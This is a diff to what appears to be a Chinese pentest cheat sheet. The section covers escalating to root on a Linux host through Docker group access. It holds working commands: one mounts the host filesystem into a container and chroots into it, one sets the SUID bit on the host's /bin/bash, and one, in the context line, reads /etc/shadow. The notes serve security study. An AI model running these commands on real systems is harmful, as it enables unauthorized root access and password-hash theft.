@@ -613,13 +613,16 @@ cat /etc/shadow
 # docker定时任务提权
 ```bash
 docker image ls # 查看是否可以提权
+# docker images
 REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
 privesc             latest              09ae39f0f8fc        2 months ago        88.3MB
 <none>              <none>              e13ad046d435        2 months ago        88.3MB
 alpine              latest              a24bb4013296        3 months ago        5.57MB
 debian              wheezy              10fcec6d95c4        18 months ago       88.3MB
 docker run -v /:/mnt --rm -it redmine chroot /mnt bash
-# docker run -it -v /:/host debian:wheezy sh
+# docker run -v /:/mnt -it alpine
+# chmod +s /mnt/bin/bash
+# 挂载到/mnt目录下，所以所有都要加上/mnt
 # https://cloud.tencent.com/developer/article/2092393
 ```
 
